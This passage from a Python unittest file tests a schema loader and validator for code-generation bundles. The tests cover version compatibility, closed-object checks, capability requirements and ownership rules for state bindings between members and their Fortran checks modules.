            path.write_text('{"title": "two"}', encoding="utf-8")
            os.utime(path, ns=(mtime, mtime))  # restore the original mtime exactly
            self.assertEqual(path.stat().st_mtime_ns, mtime)
            self.assertEqual(cb._load_schema_cached(str(path))["title"], "two")

    def test_missing_or_malformed_schema_fails_closed(self) -> None:
        with self.assertRaises(RuntimeError):
            cb._load_schema_cached("/nonexistent/codegen_bundle.schema.json")
        # the shared loader reports the path actually requested, not a hardcoded canonical one
        with self.assertRaisesRegex(RuntimeError, "harness_capabilities.schema.json"):
            cb._load_schema_cached("/nonexistent/harness_capabilities.schema.json")
        with tempfile.TemporaryDirectory() as tmp:
            broken = Path(tmp) / "broken.json"
            broken.write_text("{not json", encoding="utf-8")
            with self.assertRaises(RuntimeError):
                cb._load_schema_cached(str(broken))
            not_object = Path(tmp) / "list.json"
            not_object.write_text("[]", encoding="utf-8")
            with self.assertRaises(RuntimeError):
                cb._load_schema_cached(str(not_object))

    def test_loader_hands_out_an_isolated_copy(self) -> None:
        # The cache holds one shared document; a caller that mutated it would corrupt every
        # later reader in the process.
        cb.load_bundle_schema()["POISON"] = True
        cb.load_bundle_schema()["properties"]["files"]["POISON"] = True
        self.assertNotIn("POISON", cb.load_bundle_schema())
        self.assertNotIn("POISON", cb.load_bundle_schema()["properties"]["files"])
        cb.load_harness_capabilities_schema()["POISON"] = True
        self.assertNotIn("POISON", cb.load_harness_capabilities_schema())

    def test_major_version_mismatch_is_terminal(self) -> None:
        doc = _minimal_bundle()
        doc["bundle_schema_version"] = "2.0.0"
        doc["files"] = []  # would raise several other clauses under a matching major
        violations = cb.validate_bundle(doc)
        self.assertEqual(len(violations), 1)
        self.assertIn("bundle_schema_version major 2 is not supported", violations[0])

    def test_schema_version_pattern_rejects_an_incompatible_major(self) -> None:
        # A schema-only consumer (structured generation) must reject a non-1 major at the
        # schema boundary — the declarative pattern agrees with validate_bundle, not just the
        # generic semver shape.
        pattern = re.compile(self.schema["properties"]["bundle_schema_version"]["pattern"])
        self.assertTrue(pattern.fullmatch("1.0.0"))
        self.assertTrue(pattern.fullmatch("1.9.3"))
        for bad in ("2.0.0", "0.9.0", "10.0.0"):
            with self.subTest(version=bad):
                self.assertIsNone(pattern.fullmatch(bad))
                # and the canonical validator agrees
                self.assertNotEqual(
                    cb.validate_bundle({**_minimal_bundle(), "bundle_schema_version": bad}), [])

    def test_minor_and_patch_drift_is_accepted(self) -> None:
        doc = _minimal_bundle()
        doc["bundle_schema_version"] = "1.4.2"
        self.assertEqual(cb.validate_bundle(doc), [])

    def test_compatibility_is_backward_only_a_new_minor_field_is_rejected(self) -> None:
        # The major check gives BACKWARD compatibility (a later validator reads an earlier
        # doc), not forward: a same-major document that adds a field this validator does not
        # know is rejected by the closed-object checks — the closure is never relaxed for
        # forward compatibility, or a command could ride in on an unknown key.
        doc = _minimal_bundle()
        doc["bundle_schema_version"] = "1.9.0"
        doc["a_field_a_future_minor_adds"] = {"x": 1}
        self.assertIn("unknown key 'a_field_a_future_minor_adds' (the object is closed)",
                      cb.validate_bundle(doc))
        # the same version using only known fields validates (a valid 1.0-subset document)
        doc.pop("a_field_a_future_minor_adds")
        self.assertEqual(cb.validate_bundle(doc), [])

    def test_missing_version_is_reported(self) -> None:
        doc = _minimal_bundle()
        del doc["bundle_schema_version"]
        self.assertEqual(cb.validate_bundle(doc), ["bundle_schema_version is required"])

    def test_non_object_input_is_a_clause_not_an_exception(self) -> None:
        for value in (None, [], "bundle", 7):
            with self.subTest(value=value):
                self.assertEqual(cb.validate_bundle(value), ["bundle must be a JSON object"])

    def test_missing_required_keys_are_reported(self) -> None:
        violations = cb.validate_bundle({"bundle_schema_version": "1.0.0"})
        for key in cb.REQUIRED_BUNDLE_KEYS[1:]:
            self.assertIn(f"{key} is required", violations)

    def test_device_residency_requires_an_async_capability(self) -> None:
        doc = _minimal_bundle()
        doc["target_lowering_plan"]["state_residency"] = "device"
        violations = cb.validate_bundle(doc)
        self.assertTrue(any("requires a async_device_resident@N capability" in v
                            for v in violations))
        doc["capability_requirements"] = ["async_device_resident@1"]
        self.assertEqual(cb.validate_bundle(doc), [])

    def test_distributed_residency_requires_a_distributed_state_capability(self) -> None:
        doc = _minimal_bundle()
        doc["target_lowering_plan"]["state_residency"] = "distributed"
        violations = cb.validate_bundle(doc)
        self.assertTrue(any("requires a distributed_state@N capability" in v for v in violations))
        doc["capability_requirements"] = ["sync_single_case@1", "distributed_state@1"]
        self.assertEqual(cb.validate_bundle(doc), [])

    def test_harness_registration_binding_requires_its_capability(self) -> None:
        doc = _minimal_bundle()
        doc["state_bindings"] = [
            {"node_key": ADV, "state_variable": "q", "storage_symbol": "q_storage",
             "module": "adv1d_checks", "capture": "harness_registration",
             "capability": "state_registration@1"},
        ]
        violations = cb.validate_bundle(doc)
        self.assertTrue(any("is not declared in capability_requirements" in v
                            for v in violations))
        # the Z6 shape is additive: declare the token and the same bundle validates
        doc["capability_requirements"] = ["sync_single_case@1", "state_registration@1"]
        self.assertEqual(cb.validate_bundle(doc), [])

    def test_declared_state_registration_requires_a_binding(self) -> None:
        # The coupling holds in both directions: an unused capability requirement would
        # make the negotiated ABI wider than the bundle's actual use.
        doc = _minimal_bundle()
        doc["capability_requirements"] = ["sync_single_case@1", "state_registration@1"]
        violations = cb.validate_bundle(doc)
        self.assertTrue(any("no state_bindings[] entry captures through" in v
                            for v in violations))

    def test_reverse_coupling_is_per_registration_version(self) -> None:
        # A @1 binding does not license an unused @2 requirement — that negotiates a wider
        # ABI than the bundle uses. The coupling is per token, not "at least one binding".
        doc = _minimal_bundle()
        doc["capability_requirements"] = [
            "sync_single_case@1", "state_registration@1", "state_registration@2"]
        doc["state_bindings"] = [
            {"node_key": ADV, "state_variable": "q", "storage_symbol": "q_storage",
             "module": "adv1d_checks", "capture": "harness_registration",
             "capability": "state_registration@1"},
        ]
        self.assertIn(
            "capability_requirements declares state_registration@2 but no state_bindings[] "
            "entry captures through 'harness_registration' with it",
            cb.validate_bundle(doc))
        # binding both versions clears it
        doc["state_bindings"].append(
            {"node_key": ADV, "state_variable": "p", "storage_symbol": "p_storage",
             "module": "adv1d_checks", "capture": "harness_registration",
             "capability": "state_registration@2"})
        self.assertEqual(cb.validate_bundle(doc), [])

    def test_binding_declares_the_module_that_exports_its_storage_symbol(self) -> None:
        # Z2 renders `use <module>, only: <storage_symbol>`; a member may have several checks
        # files with freely chosen module names, so the exporting module is a declared field.
        doc = _minimal_bundle()
        del doc["state_bindings"][0]["module"]
        self.assertIn("state_bindings[0].module is required", cb.validate_bundle(doc))
        doc = _minimal_bundle()
        doc["state_bindings"][0]["module"] = "9 not an identifier"
        self.assertIn("state_bindings[0].module must be an identifier", cb.validate_bundle(doc))
        # ambiguity the field resolves: a member with two checks files is now unambiguous
        doc = _minimal_bundle()
        doc["files"].append(_file("adv1d_extra_checks.f90", "checks", ADV))
        self.assertEqual(cb.validate_bundle(doc), [])  # the binding names its module

    def test_checks_getter_binding_takes_no_capability(self) -> None:
        doc = _minimal_bundle()
        doc["state_bindings"][0]["capability"] = "state_registration@1"
        violations = cb.validate_bundle(doc)
        self.assertTrue(any("must be null for capture 'checks_getter'" in v for v in violations))

    def test_binding_module_must_be_a_checks_module_of_its_member(self) -> None:
        # A binding reads/registers storage_symbol from `module`; that module must be defined
        # by a checks-role file OWNED BY THIS MEMBER (for either capture).
        doc = _minimal_bundle()  # adv1d_checks.f90 (module adv1d_checks) for ADV + binding
        self.assertEqual(cb.validate_bundle(doc), [])
        # drop the checks file entirely: the module no longer exists -> rejected
        doc["files"] = [f for f in doc["files"] if f["role"] != "checks"]
        self.assertTrue(any(
            "module 'adv1d_checks' must be defined by a checks-role file owned by member"
            in v for v in cb.validate_bundle(doc)))

    def test_binding_module_may_not_belong_to_another_member(self) -> None:
        # The bypass Codex found: a binding for FLUX naming ADV's checks module captures ADV's
        # storage as FLUX's state. Both members own a checks file, yet this must be rejected —
        # for BOTH captures.
        for capture, capability, requirements in (
                ("checks_getter", None, ["sync_single_case@1"]),
                ("harness_registration", "state_registration@1",
                 ["sync_single_case@1", "state_registration@1"])):
            with self.subTest(capture=capture):
                doc = _multi_node_bundle()
                doc["capability_requirements"] = requirements
                doc["state_bindings"] = [
                    {"node_key": FLUX, "state_variable": "u", "storage_symbol": "get_r1",
                     "module": "adv1d_checks",  # ADV's checks module, not FLUX's
                     "capture": capture, "capability": capability},
                ]
                self.assertTrue(any(
                    "must be defined by a checks-role file owned by member" in v and FLUX in v
                    for v in cb.validate_bundle(doc)))
                # naming FLUX's own checks module is valid
                doc["state_bindings"][0]["module"] = "adv_flux_checks"
                self.assertEqual(cb.validate_bundle(doc), [])

    def test_harness_registration_module_is_ownership_checked(self) -> None:
        # Codex's finding: harness_registration validated only the capability, not the module.
        doc = _multi_node_bundle()
        doc["capability_requirements"] = ["sync_single_case@1", "state_registration@1"]
        doc["state_bindings"] = [
            {"node_key": FLUX, "state_variable": "u", "storage_symbol": "u_storage",
             "module": "does_not_exist",  # no file defines this module
             "capture": "harness_registration", "capability": "state_registration@1"},
        ]
        self.assertTrue(any("must be defined by a checks-role file owned by member" in v
                            for v in cb.validate_bundle(doc)))

    def test_binding_module_must_be_a_checks_role_file_not_the_model(self) -> None:
        doc = _minimal_bundle()
        doc["state_bindings"][0]["module"] = "adv1d_model"  # exists, but role=model
        self.assertTrue(any("must be defined by a checks-role file owned by member" in v
                            for v in cb.validate_bundle(doc)))

    def test_harness_registration_rejects_the_wrong_capability(self) -> None:
        doc = _minimal_bundle()
        doc["state_bindings"] = [
            {"node_key": ADV, "state_variable": "q", "storage_symbol": "q_storage",
             "module": "adv1d_checks", "capture": "harness_registration",
             "capability": "sync_single_case@1"},
        ]
        violations = cb.validate_bundle(doc)
        self.assertTrue(any("requires a state_registration@N capability" in v for v in violations))

    def test_state_binding_node_must_be_a_member(self) -> None:
        doc = _minimal_bundle()
        doc["state_bindings"][0]["node_key"] = "component/other@0.1.0"
        self.assertTrue(any("is not a member of optimization_unit" in v
                            for v in cb.validate_bundle(doc)))

    def test_duplicate_binding_for_one_state_variable_is_rejected(self) -> None:
        # Two bindings for the same (node_key, state_variable) leave the primary-state
        # mapping ambiguous — a consumer could register/read different storage for one state.
        doc = _minimal_bundle()
        doc["state_bindings"] = [
            {"node_key": ADV, "state_variable": "q", "storage_symbol": "get_r1",
             "module": "adv1d_checks", "capture": "checks_getter", "capability": None},
            {"node_key": ADV, "state_variable": "q", "storage_symbol": "get_r2",
             "module": "adv1d_checks", "capture": "checks_getter", "capability": None},
        ]
        self.assertIn(
            f"state_bindings[1].duplicate binding for state_variable 'q' of member {ADV!r}",
            cb.validate_bundle(doc))

    def test_same_variable_name_on_distinct_members_is_allowed(self) -> None:
        # The identity is (node_key, state_variable): two members may each bind their own `q`.
        doc = _multi_node_bundle()
        doc["state_bindings"] = [
            {"node_key": FLUX, "state_variable": "q", "storage_symbol": "get_r1",
             "module": "adv_flux_checks", "capture": "checks_getter", "capability": None},
            {"node_key": ADV, "state_variable": "q", "storage_symbol": "get_r1",
             "module": "adv1d_checks", "capture": "checks_getter", "capability": None},
        ]
        self.assertEqual(cb.validate_bundle(doc), [])

    def test_two_registration_states_may_not_share_one_storage(self) -> None:
        # For harness_registration the storage_symbol IS the registered storage, so two
        # variables sharing it register the same storage for two states — corrupt evidence.
        doc = _minimal_bundle()
        doc["capability_requirements"] = ["sync_single_case@1", "state_registration@1"]
        doc["state_bindings"] = [
            {"node_key": ADV, "state_variable": "q", "storage_symbol": "q_storage",
             "module": "adv1d_checks", "capture": "harness_registration",
             "capability": "state_registration@1"},
            {"node_key": ADV, "state_variable": "p", "storage_symbol": "q_storage",  # shared
             "module": "adv1d_checks", "capture": "harness_registration",
             "capability": "state_registration@1"},
        ]
        self.assertTrue(any("is already registered by state_variable" in v
                            for v in cb.validate_bundle(doc)))

    def test_checks_getter_may_share_a_rank_getter_across_variables(self) -> None:
        # A rank getter (`get_r1`) dispatches on the variable name, so two same-rank variables
        # legitimately share it — this must NOT be flagged as a duplicate storage target.
        doc = _minimal_bundle()
        doc["state_bindings"] = [
            {"node_key": ADV, "state_variable": "q", "storage_symbol": "get_r1",
             "module": "adv1d_checks", "capture": "checks_getter", "capability": None},
            {"node_key": ADV, "state_variable": "p", "storage_symbol": "get_r1",  # shared getter
             "module": "adv1d_checks", "capture": "checks_getter", "capability": None},
        ]
        self.assertEqual(cb.validate_bundle(doc), [])

    def test_state_bindings_may_be_absent(self) -> None:
        doc = _minimal_bundle()
        del doc["state_bindings"]
        self.assertEqual(cb.validate_bundle(doc), [])

    def test_invariants_do_not_run_on_a_structurally_broken_document(self) -> None:
        # One defect is reported once: a mistyped files[] yields the schema clause only,
        # and no invariant check has to defend against the missing shape.
        doc = _minimal_bundle()
        doc["files"] = "adv1d_model.f90"
        self.assertEqual(cb.validate_bundle(doc), ["files must be a non-empty array"])


if __name__ == "__main__":
    unittest.main()
